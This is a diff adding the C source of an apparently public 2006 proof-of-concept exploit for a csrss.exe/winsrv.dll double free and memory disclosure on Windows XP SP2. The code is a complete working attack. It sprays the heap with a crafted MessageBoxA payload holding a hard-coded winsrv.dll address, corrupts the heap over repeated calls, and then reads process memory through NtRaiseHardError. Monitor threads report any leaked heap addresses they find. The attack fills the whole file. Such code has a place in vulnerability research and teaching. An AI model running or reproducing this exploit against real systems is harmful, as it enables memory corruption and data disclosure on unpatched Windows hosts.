@@ -1,0 +1,260 @@
+/////////////////////////////////////////
+/////////////////////////////////////////
+///// Microsoft Windows NtRaiseHardError 
+///// Csrss.exe-winsrv.dll Double Free  
+/////////////////////////////////////////
+///// Ruben Santamarta  
+///// ruben at reversemode dot com
+///// www.reversemode.com 
+/////////////////////////////////////////
+///// 12.29.2006
+///// For educational purposes ONLY
+///// Compiled using gcc (Dev-C++)
+////////////////////////////////////////
+////// XP SP2
+////////////////////////////////////////
+
+
+#include <stdio.h>
+#include <windows.h>
+#include <winbase.h>
+#include <ntsecapi.h>
+
+#define UNICODE
+#define MAGIC_VALUE 0x75b4cd40  // winsrv.dll data section
+
+
+BOOL gFon=FALSE;
+
+typedef LONG NTSTATUS;
+typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
+                                    ULONG,
+                                    ULONG,
+                                    PULONG,
+                                    UINT,
+                                    PULONG);    
+
+// Csrss.exe memory monitor thread
+// (Read csrss.exe memory disclosure exploit for details)
+
+VOID WINAPI ReadBox2( LPVOID param ) 
+{ 
+
+	HWND hWindow,hButton,hText;
+	DWORD hChunk,cHeader=0;
+    int i=0,b=0;
+	int gTemp;
+	char lpTitle[300];
+	char lpText[300];
+	char lpBuff[500];
+	ZeroMemory((LPVOID)lpTitle,250);
+    ZeroMemory((LPVOID)lpText,250);
+    ZeroMemory((LPVOID)lpBuff,300);
+    Sleep(2000);
+    
+    for (;;)
+	{
+	
+		lpText[0]=(BYTE)"";
+        Sleep(1000);
+		hWindow = FindWindow("#32770",NULL);
+		ZeroMemory((LPVOID)lpTitle,250);
+    	ZeroMemory((LPVOID)lpText,250);
+    	ZeroMemory((LPVOID)lpBuff,300);
+        
+        if(hWindow != NULL)
+		{
+			GetWindowText(hWindow,(LPSTR)&lpTitle,250);
+		    
+            if(strcmp(lpTitle,"Aa")!=0)
+		    {
+    			hText=FindWindowEx(hWindow,0,"static",0);
+    		    
+    			GetWindowText(hText,(LPSTR)&lpText,250);
+    			hText=GetNextWindow(hText,GW_HWNDNEXT);
+    			
+                GetWindowText(hText,(LPSTR)&lpText,250);
+    		 
+                cHeader=*(DWORD*)lpText;
+                if( cHeader!=0)
+                {
+                      
+                      if(cHeader >0x100000 && cHeader<0x400000)
+                      {     
+                            printf("\n**************************\n");
+                            printf("Heap Chunk Found! Good Luck!\n");
+                             printf("New Value: 0x%p",cHeader);
+                           printf("\n**************************\n");
+                            
+                      }
+                      else
+                      {
+                          printf("\n****************************\n");
+                            printf("winsrv.dll data overwritten! \n");
+                            printf("New Value: 0x%p",cHeader);
+                            printf("\n****************************\n");
+                           
+                      }
+                }  
+                 else
+                {
+                    printf("\n****************************\n");
+                    printf("nothing found! ");
+                    printf("\n****************************\n");
+                }  
+                
+                cHeader=*(DWORD*)lpTitle;
+                if( cHeader!=0)
+                {
+                      
+                      if(cHeader >0x100000 && cHeader<0x400000)
+                      {     
+                            printf("\n**************************\n");
+                            printf("Heap Chunk Found! Good Luck!\n");
+                             printf("New Value: 0x%p",cHeader);
+                           printf("\n**************************\n");
+                            
+                      }
+                      else
+                      {
+                          printf("\n****************************\n");
+                            printf("winsrv.dll data overwritten! \n");
+                            printf("New Value: 0x%p",cHeader);
+                            printf("\n****************************\n");
+                           
+                      }
+                }    
+                else
+                {
+                    printf("\n****************************\n");
+                    printf("nothing found! ");
+                    printf("\n****************************\n");
+                }
+                
+            }
+            
+            SendMessage(hWindow,WM_CLOSE,0,0); 
+   			ZeroMemory((LPVOID)lpTitle,250);
+    		ZeroMemory((LPVOID)lpText,250);
+    		ZeroMemory((LPVOID)lpBuff,300);
+        }
+        CloseHandle(hWindow);
+	}
+
+}
+
+VOID WINAPI ReadBox( LPVOID param ) 
+{ 
+
+	HWND hWindow;
+	
+    for (;;)
+	{
+        Sleep(1000);
+		if(!gFon)
+        {
+                 hWindow = FindWindow("#32770",NULL);
+		
+                 if(hWindow != NULL )
+		         {
+                  SendMessage(hWindow,WM_CLOSE,0,0);
+                  }
+        }
+	}
+
+}
+
+
+int main()
+{
+ 
+ 
+   UNICODE_STRING uStr={5,5,L"fun!"};
+   ULONG retValue,args[]={MAGIC_VALUE,MAGIC_VALUE,(ULONG)&uStr};
+   PNTRAISE NtRaiseHardError; 
+   DWORD dwThreadId;  
+
+   byte  *ShellCode ="\x5C\x3F\x3F\x5C\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
+                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75";
+                     
+   int i=0;
+   
+   NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle("ntdll.dll"),
+                                               "NtRaiseHardError");  
+	system("cls");
+    printf("##########################################\n");
+    printf("### Microsoft Windows NtRaiseHardError ###\n");
+    printf("### Csrss.exe-winsrv.dll Double-Free   ###\n");
+    printf("## Ruben Santamarta www.reversemode.com ##\n");
+    printf("##########################################\n");
+  	printf("## + Csrss.exe Double-Free     Exploit  ##\n");
+  	printf("## + Csrss.exe Memory Disclosure Exploit##\n");
+  	printf("##########################################\n");
+    printf("# XP SP 2                                #\n");
+  	printf("##########################################\n\n");
+    printf("\nThe exploit overwrites controlled addresses\n");
+  	printf("in winsrv.dll data section within Csrss.exe\n\n");
+   	
+    CreateThread( NULL,              
+				  0,                  
+				 (LPTHREAD_START_ROUTINE)ReadBox,        
+				  0,             
+				  0,                 
+				 &dwThreadId);
+   
+   // Seeding the heap               
+   for(i=0;i<2;i++) MessageBoxA(0,"\x40\xcd\xb4\x75","\x40\xcd\xb4\x75", MB_SERVICE_NOTIFICATION);
+	
+   // Exploiting Csrss.exe Double-Free 
+   
+   printf("[*] Stage 1 -= Hitting Heap =-\n\n")	;		 
+   printf("[+] Corrupting the heap (11 attemps)\n\n");
+    
+   for( i=0; i<11; i++)
+   {
+           
+           printf("#%d... ",i+1); 
+           MessageBoxA(0, ShellCode,"A", MB_SERVICE_NOTIFICATION);
+   }
+    
+    gFon=TRUE;
+  
+    printf("\n\n[*] Stage 2 -= Scanning winsrv.dll data section =-\n\n") ; 
+    Sleep(2000);
+    
+    CreateThread( NULL,              
+				  0,                  
+				 (LPTHREAD_START_ROUTINE)ReadBox2,        
+				  0,             
+				  0,                 
+				 NULL); 
+    
+    args[0]-=0x20;	 
+    
+    // Exploiting Csrss.exe memory disclosure flaw
+    
+    for(i=0;i<0xF;i++)
+    {
+        args[0]+=4;   
+        printf("\n#%d Reading at : [0x%p]\n",i,args[0]);                                      
+        NtRaiseHardError(0x50000018,3,4,args,1,&retValue);
+    }
+   
+    printf("\n[+] Exploit exiting\n\n");
+    printf("#############################################################\n");
+    printf("If you didn't find anything, run the exploit one more time!\n");
+    printf("If you find a heap chunk address, enjoy!\n");
+    printf("#############################################################\n");
+  
+  
+ }
+
+// milw0rm.com [2006-12-31]
